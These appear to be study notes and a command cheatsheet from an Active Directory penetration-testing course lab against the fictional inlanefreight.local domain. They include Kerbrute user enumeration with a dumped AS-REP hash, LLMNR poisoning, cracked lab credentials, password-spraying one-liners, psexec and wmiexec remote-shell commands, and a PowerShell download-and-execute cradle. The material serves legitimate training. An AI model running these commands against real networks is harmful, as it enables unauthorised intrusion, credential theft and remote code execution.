| Data Point           | Description                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `IP Space`           | Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.                                                                                                                                                                                                                                                                            |
| `Domain Information` | Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)                                                                                                                      |
| `Schema Format`      | Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.                                                                                                                                                                |
| `Data Disclosures`   | For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain intranet site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.) |
| `Breach Data`        | Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.                                                                                                                                                                                                                                                                                                                          |

| Resource                       | Examples                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ASN / IP registrars            | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)                                                                                                                                                                                                                                                       |
| Domain Registrars & DNS        | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8.                                                                                                                                                                                               |
| Social Media                   | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.                                                                                                                                                                                                                                                                                 |
| Public-Facing Company Websites | Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.                                                                                                                                                                                                                                                       |
| Cloud & Dev Storage Spaces     | GitHub, [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)                                                                                                                                                                                                                                                               |
| Breach Data Sources            | [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication. |

**LOOT**

- IP Address: 134.209.24.248
- Mail Server: mail1.inlanefreight.com
- Nameservers: NS1.inlanefreight.com & NS2.inlanefreight.com

```sh
woadey@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : roger.grimes@inlanefreight.local
username : rgrimes
password : Ilovefishing!
hashed_password :
name : Roger Grimes
vin :
address :
phone :
database_name : ModBSolutions

id : 7344467234
email : jane.yu@inlanefreight.local
username : jyu
password : Starlight1982_!
hashed_password :
name : Jane Yu
vin :
address :
phone :
database_name : MyFitnessPal
```

### Initial Enumeration

**LOOT**
Hosts:

- 172.16.5.5 (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL)
- 172.16.5.25
- 172.16.5.50
- 172.16.5.100 (ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL)
- 172.16.5.125
- 172.16.5.200
- 172.16.5.225
- 172.16.5.238
- 172.16.5.240

```sh
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 03/30/24 - Ronnie Flathers @ropnop

2024/03/30 20:24:55 >  Using KDC(s):
2024/03/30 20:24:55 >  	172.16.5.5:88

2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2024/03/30 20:24:55 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:71fe08c6abb69e7c4771d1402401ddaa$a83a808e1db12acb074905bb1b471bf5852a40bc63a6b0f869f5a094ef6c046159802fd90cb313b22eb1f8b8ad1a039710a4f354e6fc77541dacfef164b19b321b7882e82e6cc226b2805c50e3e15115fdbe07b43b0b035ac85dc0b33cc489263999433b88725152114e3bc01d2321b879e04c31277a316aac44808d8aaaa6bfabcdb153d83b2c2cc68ef3e2b7005e3cb390fbc45ed557e6a5d80699fe9f9761558ac6f216f9dddfe2c4e7162389f72eadc3f696a8952bbac270fc0360fe832ec791df58e27f428da47ed4b1b0165d3a4f91ba99fe2d9c96b1b1c4a160da332abd1b58a155b08cf8bcfc9f97c84fcc5ebb7144402ce062562e5171fa32fa7ee4f4fcfcc9672f856ac53d
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
2024/03/30 20:24:56 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
2024/03/30 20:24:57 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
2024/03/30 20:24:57 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
2024/03/30 20:24:57 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
2024/03/30 20:24:57 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
2024/03/30 20:24:57 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
2024/03/30 20:24:58 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
2024/03/30 20:24:58 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
2024/03/30 20:24:58 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
2024/03/30 20:24:58 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
2024/03/30 20:24:58 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
2024/03/30 20:24:58 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
2024/03/30 20:24:59 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
2024/03/30 20:24:59 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
2024/03/30 20:24:59 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
2024/03/30 20:24:59 >  [+] VALID USERNAME:	 minman@inlanefreight.local
2024/03/30 20:24:59 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
2024/03/30 20:24:59 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
2024/03/30 20:25:00 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
2024/03/30 20:25:00 >  [+] VALID USERNAME:	 strent@inlanefreight.local
2024/03/30 20:25:01 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
2024/03/30 20:25:01 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
2024/03/30 20:25:01 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
2024/03/30 20:25:02 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
2024/03/30 20:25:03 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
2024/03/30 20:25:03 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
2024/03/30 20:25:03 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
2024/03/30 20:25:04 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
2024/03/30 20:25:05 >  Done! Tested 48705 usernames (56 valid) in 10.038 seconds
```

`mmorgan@INLANEFREIGHT.LOCAL:Welcome!00`

### LLMNR/NBT-NS Poisoning

**LOOT**
`./hashcat.exe -m 5600 -a 0 hashes/[target-hash].hash rockyou.txt`
MSSQL: `FOREND:Klmcargo2`
SMB: `wley:transporter@4`
NTLMv2: `backupagent:h1backup55`
NTLMv2: `svc_qualys:security#1`

### Cheatsheet

**Initial Enumeration**

| Command                                                                                             | Description                                                                                                                                                                                                                                                                                          |
| --------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nslookup ns1.inlanefreight.com`                                                                    | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.                                                                                                                                                               |
| `sudo tcpdump -i ens224`                                                                            | Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host.                                                                                                                                                                                        |
| `sudo responder -I ens224 -A`                                                                       | Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host.                                                                    |
| `fping -asgq 172.16.5.0/23`                                                                         | Performs a ping sweep on the specified network segment from a Linux-based host.                                                                                                                                                                                                                      |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`                                  | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host. |
| `sudo git clone https://github.com/ropnop/kerbrute.git`                                             | Uses git to clone the kerbrute tool from a Linux-based host.                                                                                                                                                                                                                                         |
| `make help`                                                                                         | Used to list compiling options that are possible with make from a Linux-based host.                                                                                                                                                                                                                  |
| `sudo make all`                                                                                     | Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures.                                                                                                                                                                                                                   |
| `./kerbrute_linux_amd64`                                                                            | Used to test the chosen complied Kebrute binary from a Linux-based host.                                                                                                                                                                                                                             |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`                                              | Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.                                                                                                                                                                           |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.              |

**LLMNR/NTB-NS Poisoning**

| Command                                                                                                                                                                                                       | Description                                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `responder -h`                                                                                                                                                                                                | Used to display the usage instructions and various options available in Responder from a Linux-based host.                                                       |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`                                                                                                                                              | Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1`                                                                                                                                                                                 | Using the Import-Module PowerShell cmd-let to import the Windows-based tool Inveigh.ps1.                                                                         |
| `(Get-Command Invoke-Inveigh).Parameters`                                                                                                                                                                     | Used to output many of the options & functionality available with Invoke-Inveigh. Peformed from a Windows-based host.                                            |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`                                                                                                                                                     | Starts Inveigh on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file.                                                     |
| `.\Inveigh.exe`                                                                                                                                                                                               | Starts the C# implementation of Inveigh from a Windows-based host.                                                                                               |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.                                                                                                      |

**Password Spraying & Password Policies**

| Command                                                                                                                              | Description                                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done`                                 | Bash script used to generate 16,079,616 possible username combinations from a Linux-based host.                                                                                                                                                |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`                                                                  | Uses CrackMapExecand valid credentials (avazquez:Password123) to enumerate the password policy (--pass-pol) from a Linux-based host.                                                                                                           |
| `rpcclient -U "" -N 172.16.5.5`                                                                                                      | Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.                                                                                                                          |
| `rpcclient $> querydominfo`                                                                                                          | Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.                                                                                                                                            |
| `enum4linux -P 172.16.5.5`                                                                                                           | Uses enum4linux to enumerate the password policy (-P) in a target Windows domain from a Linux-based host.                                                                                                                                      |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                                                                                          | Uses enum4linux-ng to enumerate the password policy (-P) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the -oA option.                                                |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength`                          | Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.                                                                                                                                           |
| `net accounts`                                                                                                                       | Used to enumerate the password policy in a Windows domain from a Windows-based host.                                                                                                                                                           |
| `Import-Module .\PowerView.ps1`                                                                                                      | Uses the Import-Module cmd-let to import the PowerView.ps1 tool from a Windows-based host.                                                                                                                                                     |
| `Get-DomainPolicy`                                                                                                                   | Used to enumerate the password policy in a target Windows domain from a Windows-based host.                                                                                                                                                    |
| `enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"`                                                         | Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host.                                                                               |
| `rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser`                                                                             | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.                                                                                                                                                   |
| `crackmapexec smb 172.16.5.5 --users`                                                                                                | Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.                                                                                                                                              |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` | Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.                                                                                       |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`                                                                                      | Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host.                                                                                                                                     |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done`             | Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner.                                       |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`                                             | Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.                                                                                             |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                                       | Uses CrackMapExec and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using grep.                                          |
| `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                                        | Uses CrackMapExec to validate a set of credentials from a Linux-based host.                                                                                                                                                                    |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`                    | Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep. |
| `Import-Module .\DomainPasswordSpray.ps1`                                                                                            | Used to import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host.                                                                                                                                                    |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`                                 | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.                                                                                                          |

**Enumerating Security Controls**

| Command                                                                    | Description                                                                                                                                                                              |
| -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-MpComputerStatus`                                                     | PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.                                                                                    |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view AppLocker policies from a Windows-based host.                                                                                                            |
| `$ExecutionContext.SessionState.LanguageMode`                              | PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.                                                 |
| `Find-LAPSDelegatedGroups`                                                 | A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.                                                                                                   |
| `Find-AdmPwdExtendedRights`                                                | A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host. |
| `Get-LAPSComputers`                                                        | A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.      |

**Credentialed Enumeration**

| Command                                                                                          | Description                                                                                                                                                                                                                                                                     |
| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`                             | Connects to a Windows target using valid credentials. Performed from a Linux-based host.                                                                                                                                                                                        |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`                                | Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (--users) in a target Windows domain. Performed from a Linux-based host.                                                                                               |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`                               | Authenticates with a Windows target over smb using valid credentials and attempts to discover groups (--groups) in a target Windows domain. Performed from a Linux-based host.                                                                                                  |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`                     | Authenticates with a Windows target over smb using valid credentials and attempts to check for a list of logged on users (--loggedon-users) on the target Windows host. Performed from a Linux-based host.                                                                      |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`                               | Authenticates with a Windows target over smb using valid credentials and attempts to discover any smb shares (--shares). Performed from a Linux-based host.                                                                                                                     |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`       | Authenticates with a Windows target over smb using valid credentials and utilizes the CrackMapExec module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON. Performed from a Linux-based host.     |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`                             | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (-H). Performed from a Linux-based host.                                             |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`        | Enumerates the target Windows domain using valid credentials and performs a recursive listing (-R) of the specified share (SYSVOL) and only outputs a list of directories (--dir-only) in the share. Performed from a Linux-based host.                                         |
| `rpcclient $> queryuser 0x457`                                                                   | Enumerates a target user account in a Windows domain using its relative identifier (0x457). Performed from a Linux-based host.                                                                                                                                                  |
| `rpcclient $> enumdomusers`                                                                      | Discovers user accounts in a target Windows domain and their associated relative identifiers (rid). Performed from a Linux-based host.                                                                                                                                          |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`                                | Impacket tool used to connect to the CLI of a Windows target via the ADMIN$ administrative share with valid credentials. Performed from a Linux-based host.                                                                                                                     |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`                                 | Impacket tool used to connect to the CLI of a Windows target via WMI with valid credentials. Performed from a Linux-based host.                                                                                                                                                 |
| `windapsearch.py -h`                                                                             | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.                                                                                                                                                                            |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`         | Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.                                                                                                                                |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`          | Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host.                                                                                                                                          |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (-ns) and target Windows domain (inlanefreight.local) as well as runs all checks (-c all). Runs using valid credentials. Performed from a Linux-based host. |

**Enumeration by Living Off the Land**

| Command                                                                                  | Description                                                                                                                                                                             |
| ---------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                             | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.                                                                     |
| `Import-Module ActiveDirectory`                                                          | Loads the Active Directory PowerShell module from a Windows-based host.                                                                                                                 |
| `Get-ADDomain`                                                                           | PowerShell cmd-let used to gather Windows domain information from a Windows-based host.                                                                                                 |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.                                  |
| `Get-ADTrust -Filter *`                                                                  | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter \*). Performed from a Windows-based host.                           |
| `Get-ADGroup -Filter * \| select name`                                                   | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (select name). Performed from a Windows-based host.                         |
| `Get-ADGroup -Identity "Backup Operators"`                                               | PowerShell cmd-let used to search for a specifc group (-Identity "Backup Operators"). Performed from a Windows-based host.                                                              |
| `Get-ADGroupMember -Identity "Backup Operators"`                                         | PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.                                                |
| `Export-PowerViewCSV`                                                                    | PowerView script used to append results to a CSV file. Performed from a Windows-based host.                                                                                             |
| `ConvertTo-SID`                                                                          | PowerView script used to convert a User or Group name to it's SID. Performed from a Windows-based host.                                                                                 |
| `Get-DomainSPNTicket`                                                                    | PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host.                                                 |
| `Get-Domain`                                                                             | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.                                                              |
| `Get-DomainController`                                                                   | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.                                           |
| `Get-DomainUser`                                                                         | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.                                                                          |
| `Get-DomainComputer`                                                                     | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.                                                                  |
| `Get-DomainGroup`                                                                        | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.                                                                         |
| `Get-DomainOU`                                                                           | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.                                                                              |
| `Find-InterestingDomainAcl`                                                              | PowerView script used to find object ACLs in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.                                      |
| `Get-DomainGroupMember`                                                                  | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.                                                                            |
| `Get-DomainFileServer`                                                                   | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.                                                              |
| `Get-DomainDFSShare`                                                                     | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.                                      |
| `Get-DomainGPO`                                                                          | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.                                                                            |
| `Get-DomainPolicy`                                                                       | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.                                  |
| `Get-NetLocalGroup`                                                                      | PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.                                                                      |
| `Get-NetLocalGroupMember`                                                                | PowerView script enumerate members of a specific local group. Performed from a Windows-based host.                                                                                      |
| `Get-NetShare`                                                                           | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.                                                            |
| `Get-NetSession`                                                                         | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.                                                           |
| `Test-AdminAccess`                                                                       | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.                                    |
| `Find-DomainUserLocation`                                                                | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.                                                                       |
| `Find-DomainShare`                                                                       | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.                                                                                 |
| `Find-InterestingDomainShareFile`                                                        | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.                                              |
| `Find-LocalAdminAccess`                                                                  | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.                                   |
| `Get-DomainTrust`                                                                        | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.                                                          |
| `Get-ForestTrust`                                                                        | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.                                                      |
| `Get-DomainForeignUser`                                                                  | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.                                                             |
| `Get-DomainForeignGroupMember`                                                           | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.                                  |
| `Get-DomainTrustMapping`                                                                 | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.                                                                |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`                               | PowerView script used to list all the members of a target group ("Domain Admins") through the use of the recurse option (-Recurse). Performed from a Windows-based host.                |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`                    | PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host.                                         |
| `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`                                       | Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

**Transfering Files**

| Command                                                                                                                  | Description                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| `sudo python3 -m http.server 8001`                                                                                       | Starts a python web server for quick hosting of files. Performed from a Linux-based host.            |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`                                   | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket SMB server for quick hosting of a file. Performed from a Windows-based host.       |

**Kerberoasting**

| Command                                                                                                                                                                                                         | Description                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `sudo python3 -m pip install .`                                                                                                                                                                                 | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.                                                                 |
